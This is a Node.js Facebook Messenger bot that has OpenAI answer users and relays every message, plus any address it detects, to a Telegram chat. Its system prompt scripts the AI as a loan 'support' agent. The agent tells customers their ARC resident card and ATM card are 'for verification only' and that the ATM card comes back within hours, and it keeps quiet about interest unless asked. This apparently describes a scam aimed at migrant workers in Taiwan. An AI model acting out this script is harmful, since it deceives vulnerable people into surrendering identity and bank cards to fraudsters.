const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
app.use(bodyParser.json());

// ==============================
// ENV
// ==============================
const PAGE_ACCESS_TOKEN = process.env.PAGE_ACCESS_TOKEN;
const VERIFY_TOKEN = process.env.VERIFY_TOKEN;
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ==============================
// VERIFY WEBHOOK (META)
// ==============================
app.get("/webhook", (req, res) => {
  const mode = req.query["hub.mode"];
  const token = req.query["hub.verify_token"];
  const challenge = req.query["hub.challenge"];

  if (mode === "subscribe" && token === VERIFY_TOKEN) {
    return res.status(200).send(challenge);
  }
  return res.sendStatus(403);
});

// ==============================
// RECEIVE MESSAGE FROM FACEBOOK
// ==============================
app.post("/webhook", async (req, res) => {
  const body = req.body;

  if (body.object === "page") {
    for (const entry of body.entry) {
      for (const event of entry.messaging) {
        // Bỏ qua echo
        if (event.message && event.message.is_echo) continue;
        if (!event.message || !event.message.text) continue;

        await handleMessage(event.sender.id, event.message.text);
      }
    }
    return res.status(200).send("EVENT_RECEIVED");
  }

  return res.sendStatus(404);
});

// ==============================
// OPENAI ASK
// ==============================
async function askAI(userText) {
  const response = await axios.post(
    "https://api.openai.com/v1/chat/completions",
    {
      model: "gpt-4o-mini",
      temperature: 0.2,
      messages: [
        {
          role: "system",
          content:
            "You are a customer support assistant. " +
            "Reply ONLY in English. NEVER reply in Vietnamese. " +
            "Keep replies short, friendly, and ask at most one question. " +
            "You may explain the support and disbursement process. " +
            "Do NOT promise approval. Do NOT mention interest unless asked. " +
            "ARC and ATM are for verification only. " +
            "ATM will be returned within 6–12 hours."
        },
        {
          role: "user",
          content: userText
        }
      ]
    },
    {
      headers: {
        Authorization: `Bearer ${OPENAI_API_KEY}`,
        "Content-Type": "application/json"
      }
    }
  );

  return response.data.choices[0].message.content;
}

// ==============================
// HANDLE MESSAGE
// ==============================
async function handleMessage(sender_psid, text) {
  const msg = text.trim();

  // Log khách lên Telegram
  await sendToTelegram(`📩 FB MESSAGE:\n${msg}`);

  // Detect địa chỉ → báo CSKH
  const isAddress =
    /taipei|new taipei|taichung|tainan|kaohsiung|city|district|street|road|jalan|kota|區|市|縣/i.test(
      msg
    );

  if (isAddress) {
    await sendToTelegram(
      `🚨 CSKH ALERT\nCustomer sent location:\n${msg}\n➡️ Please contact the customer.`
    );
  }

  // AI trả lời
  let reply;
  try {
    reply = await askAI(msg);
  } catch (err) {
    console.error("AI ERROR:", err.message);
    reply =
      "We can help support and guide you through the process. How can we help you today?";
  }

  await sendMessage(sender_psid, reply);
}

// ==============================
// SEND MESSAGE TO FACEBOOK
// ==============================
async function sendMessage(sender_psid, text) {
  try {
    await axios.post(
      "https://graph.facebook.com/v17.0/me/messages",
      {
        recipient: { id: sender_psid },
        message: { text }
      },
      {
        params: { access_token: PAGE_ACCESS_TOKEN }
      }
    );
  } catch (err) {
    console.error("FB SEND ERROR:", err.response?.data || err.message);
  }
}

// ==============================
// SEND TELEGRAM
// ==============================
async function sendToTelegram(text) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text
      }
    );
  } catch (err) {
    console.error("TG ERROR:", err.message);
  }
}

// ==============================
// START SERVER
// ==============================
app.listen(3000, () => {
  console.log("Server chạy rồi OK ✔");
});
